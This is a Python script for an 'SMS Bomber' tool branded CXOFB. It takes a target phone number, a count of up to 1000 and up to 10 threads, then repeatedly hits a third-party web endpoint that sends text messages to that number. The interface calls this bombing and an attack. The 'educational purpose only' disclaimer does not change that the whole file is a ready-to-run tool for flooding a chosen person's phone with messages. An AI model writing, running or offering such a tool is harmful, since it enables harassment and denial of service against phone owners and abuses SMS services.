"""
SMS Bomber API Client - Educational Purpose Only
⚠️ WARNING: Use this only for testing with proper consent
Developer: Team NFB
"""

import requests
import time
import threading
import sys
import os
from colorama import init, Fore, Back, Style
import pyfiglet
from datetime import datetime

# Initialize colorama
init(autoreset=True)

class TerminalUI:
    """Enhanced Terminal UI Design"""
    
    @staticmethod
    def clear_screen():
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def print_header():
        """Print styled header"""
        TerminalUI.clear_screen()
        
        # ASCII Art Banner with gradient effect
        banner = pyfiglet.figlet_format("CXOFB", font="big")
        print(Fore.CYAN + Style.BRIGHT + banner)
        
        banner2 = pyfiglet.figlet_format("SMS BOMBER", font="standard")
        print(Fore.MAGENTA + Style.BRIGHT + banner2)
        
        # Decorative border
        print(Fore.YELLOW + "╔" + "═" * 60 + "╗")
        print(Fore.YELLOW + "║" + Fore.CYAN + Style.BRIGHT + " 🚀 ULTRA VERSION v2.0 ".center(60) + Fore.YELLOW + "║")
        print(Fore.YELLOW + "║" + Fore.GREEN + " 🔥 POWERED BY TEAM CXOFB ".center(60) + Fore.YELLOW + "║")
        print(Fore.YELLOW + "╚" + "═" * 60 + "╝")
        
        # Status bar
        print(Fore.GREEN + Style.BRIGHT + "\n┌" + "─" * 58 + "┐")
        print(Fore.GREEN + "│" + Fore.WHITE + " 🌐 API STATUS: " + Fore.GREEN + "ONLINE 🟢" + " " * 35 + Fore.GREEN + "│")
        print(Fore.GREEN + "│" + Fore.WHITE + " ⚡ SPEED: " + Fore.YELLOW + "INSANE ⚡" + " " * 38 + Fore.GREEN + "│")
        print(Fore.GREEN + "│" + Fore.WHITE + " 📡 SERVER: " + Fore.CYAN + "CXOFB CLOUD ☁️" + " " * 32 + Fore.GREEN + "│")
        print(Fore.GREEN + "└" + "─" * 58 + "┘")
    
    @staticmethod
    def print_disclaimer():
        """Print styled disclaimer"""
        print(Fore.RED + Style.BRIGHT + "\n╔" + "═" * 58 + "╗")
        print(Fore.RED + "║" + Fore.YELLOW + Style.BRIGHT + " ⚠️  IMPORTANT DISCLAIMER ".center(58) + Fore.RED + "║")
        print(Fore.RED + "╠" + "═" * 58 + "╣")
        print(Fore.RED + "║" + Fore.WHITE + " 🚫 DO NOT USE FOR HARMFUL OR ILLEGAL PURPOSES!".ljust(58) + Fore.RED + "║")
        print(Fore.RED + "║" + Fore.WHITE + " 🎯 FOR EDUCATIONAL & TESTING PURPOSES ONLY".ljust(58) + Fore.RED + "║")
        print(Fore.RED + "║" + Fore.WHITE + " 🔒 USER RESPONSIBLE FOR ANY MISUSE".ljust(58) + Fore.RED + "║")
        print(Fore.RED + "╚" + "═" * 58 + "╝")
    
    @staticmethod
    def print_progress_bar(current, total, width=50):
        """Print animated progress bar"""
        progress = current / total
        filled = int(width * progress)
        bar = "█" * filled + "░" * (width - filled)
        
        # Color gradient based on progress
        if progress < 0.3:
            color = Fore.RED
        elif progress < 0.7:
            color = Fore.YELLOW
        else:
            color = Fore.GREEN
            
        sys.stdout.write(f"\r{color}📊 Progress: [{bar}] {progress*100:.1f}%")
        sys.stdout.flush()
    
    @staticmethod
    def print_stats(successful, failed, total):
        """Print statistics in a styled box"""
        print(Fore.CYAN + "\n┌" + "─" * 58 + "┐")
        print(Fore.CYAN + "│" + Fore.YELLOW + Style.BRIGHT + " 📊 FINAL STATISTICS ".center(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "├" + "─" * 58 + "┤")
        print(Fore.CYAN + "│" + Fore.GREEN + f" ✅ SUCCESSFUL: {successful}".ljust(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "│" + Fore.RED + f" ❌ FAILED: {failed}".ljust(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "│" + Fore.YELLOW + f" 📊 TOTAL: {total}".ljust(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "│" + Fore.WHITE + f" ⏱️  TIME: {datetime.now().strftime('%H:%M:%S')}".ljust(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "└" + "─" * 58 + "┘")

class SMSBomber:
    def __init__(self):
        self.api_url = "https://cxofb.teamsbapp.com/CXOFB/sms-bomber1.php"
        self.session = requests.Session()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        self.stop_flag = False
        self.ui = TerminalUI()
        self.successful = 0
        self.failed = 0
        self.total_count = 0

    def send_sms(self, number):
        """Send SMS to the given number with enhanced error handling"""
        try:
            params = {'number': number}
            response = self.session.get(
                self.api_url, 
                params=params, 
                headers=self.headers, 
                timeout=10
            )
            
            # Check response
            if response.status_code == 200:
                # Try to parse JSON response
                try:
                    data = response.json()
                    if data.get('status') == 'success':
                        return True, "SMS sent successfully"
                    else:
                        return False, data.get('message', 'Unknown error')
                except:
                    return True, "SMS sent successfully"
            else:
                return False, f"HTTP {response.status_code}"
                
        except requests.exceptions.Timeout:
            return False, "Timeout error"
        except requests.exceptions.ConnectionError:
            return False, "Connection error"
        except Exception as e:
            return False, str(e)

    def send_bulk_sms(self, number, total_count, thread_count=5):
        """Send multiple SMS using threading with enhanced UI"""
        self.stop_flag = False
        self.successful = 0
        self.failed = 0
        self.total_count = total_count
        
        # Show initial info
        print(Fore.CYAN + Style.BRIGHT + "\n┌" + "─" * 58 + "┐")
        print(Fore.CYAN + "│" + Fore.YELLOW + " 📱 TARGET INFORMATION ".center(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "├" + "─" * 58 + "┤")
        print(Fore.CYAN + "│" + Fore.WHITE + f" 📞 Number: {number}".ljust(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "│" + Fore.WHITE + f" 📊 Total: {total_count}".ljust(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "│" + Fore.WHITE + f" 🧵 Threads: {thread_count}".ljust(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "└" + "─" * 58 + "┘")
        
        print(Fore.GREEN + Style.BRIGHT + "\n🔄 SENDING SMS... (Press Ctrl+C to stop)\n")
        
        def send_sms_thread(thread_id, number, count_per_thread):
            """Thread worker function"""
            for i in range(count_per_thread):
                if self.stop_flag:
                    break
                
                # Send SMS
                success, message = self.send_sms(number)
                
                # Update stats
                if success:
                    self.successful += 1
                    status = Fore.GREEN + "✅"
                else:
                    self.failed += 1
                    status = Fore.RED + "❌"
                
                # Show progress with thread ID
                total_done = self.successful + self.failed
                progress = (total_done / self.total_count) * 100
                
                # Animated progress bar
                self.ui.print_progress_bar(total_done, self.total_count)
                
                # Show status message
                if total_done % 5 == 0 or total_done == self.total_count:
                    sys.stdout.write(f" {status} T{thread_id+1}")
                    sys.stdout.flush()
                
                # Dynamic delay
                time.sleep(0.3 + (self.failed / max(1, self.successful + self.failed)) * 0.2)

        # Calculate SMS per thread
        sms_per_thread = total_count // thread_count
        remainder = total_count % thread_count
        
        # Create and start threads
        threads = []
        for i in range(thread_count):
            count = sms_per_thread + (1 if i < remainder else 0)
            thread = threading.Thread(
                target=send_sms_thread,
                args=(i, number, count)
            )
            threads.append(thread)
            thread.daemon = True
            thread.start()
        
        # Wait for all threads to complete
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            self.stop_flag = True
            print(Fore.YELLOW + "\n\n🛑 Stopping all threads... Please wait")
            for thread in threads:
                thread.join(timeout=1)
        
        # Show final statistics
        self.ui.print_stats(self.successful, self.failed, self.successful + self.failed)
        
        return self.successful, self.failed

    def stop_sending(self):
        """Stop all active threads"""
        self.stop_flag = True
        print(Fore.YELLOW + Style.BRIGHT + "\n🛑 Stopping all SMS sending...")

def main():
    bomber = SMSBomber()
    ui = TerminalUI()
    
    # Clear and show header
    ui.print_header()
    ui.print_disclaimer()
    
    # Animated input prompt
    print(Fore.CYAN + Style.BRIGHT + "\n╔" + "═" * 58 + "╗")
    print(Fore.CYAN + "║" + Fore.YELLOW + " 📝 INPUT REQUIRED ".center(58) + Fore.CYAN + "║")
    print(Fore.CYAN + "╚" + "═" * 58 + "╝")
    
    try:
        # Get user input with validation
        while True:
            number = input(Fore.CYAN + Style.BRIGHT + "\n📱 Phone Number (e.g., 8801xxxxxxx): " + Fore.WHITE)
            if number and len(number) >= 11:
                break
            print(Fore.RED + "❌ Invalid number! Please enter a valid phone number.")
        
        while True:
            try:
                count = int(input(Fore.CYAN + Style.BRIGHT + "📊 SMS Count (1-1000): " + Fore.WHITE))
                if 1 <= count <= 1000:
                    break
                print(Fore.RED + "❌ Count must be between 1 and 1000!")
            except ValueError:
                print(Fore.RED + "❌ Please enter a valid number!")
        
        while True:
            try:
                threads = int(input(Fore.CYAN + Style.BRIGHT + "🧵 Threads (1-10): " + Fore.WHITE))
                if 1 <= threads <= 10:
                    break
                print(Fore.RED + "❌ Threads must be between 1 and 10!")
            except ValueError:
                print(Fore.RED + "❌ Please enter a valid number!")
        
        # Confirmation
        print(Fore.YELLOW + Style.BRIGHT + "\n╔" + "═" * 58 + "╗")
        print(Fore.YELLOW + "║" + Fore.WHITE + " 📋 CONFIRMATION ".center(58) + Fore.YELLOW + "║")
        print(Fore.YELLOW + "╠" + "═" * 58 + "╣")
        print(Fore.YELLOW + "║" + Fore.CYAN + f" Target: {number}".ljust(58) + Fore.YELLOW + "║")
        print(Fore.YELLOW + "║" + Fore.CYAN + f" Count: {count}".ljust(58) + Fore.YELLOW + "║")
        print(Fore.YELLOW + "║" + Fore.CYAN + f" Threads: {threads}".ljust(58) + Fore.YELLOW + "║")
        print(Fore.YELLOW + "╚" + "═" * 58 + "╝")
        
        confirm = input(Fore.GREEN + Style.BRIGHT + "\n🚀 Start bombing? (y/n): " + Fore.WHITE).lower()
        if confirm != 'y':
            print(Fore.YELLOW + "❌ Operation cancelled!")
            return
        
        # Start bombing
        print(Fore.GREEN + Style.BRIGHT + "\n🚀 INITIALIZING ATTACK...\n")
        time.sleep(1)
        
        bomber.send_bulk_sms(number, count, threads)
        
    except KeyboardInterrupt:
        bomber.stop_sending()
        print(Fore.YELLOW + Style.BRIGHT + "\n\n👋 Thank you for using CXOFB SMS Bomber!")
        
    except Exception as e:
        print(Fore.RED + Style.BRIGHT + f"\n❌ Error: {str(e)}")
    
    # Footer
    print(Fore.MAGENTA + Style.BRIGHT + "\n╔" + "═" * 58 + "╗")
    print(Fore.MAGENTA + "║" + Fore.YELLOW + " 🌟 STAY WITH CXOFB 🌟 ".center(58) + Fore.MAGENTA + "║")
    print(Fore.MAGENTA + "║" + Fore.CYAN + " 💎 FOLLOW US FOR MORE EXCLUSIVE APIS 💎 ".center(58) + Fore.MAGENTA + "║")
    print(Fore.MAGENTA + "╚" + "═" * 58 + "╝")
    
    # Exit with animation
    for i in range(3, 0, -1):
        sys.stdout.write(f"\r{Fore.YELLOW}👋 Exiting in {i}...")
        sys.stdout.flush()
        time.sleep(0.5)
    print(Fore.GREEN + "\n✨ Goodbye! ✨")

if __name__ == "__main__":
    main()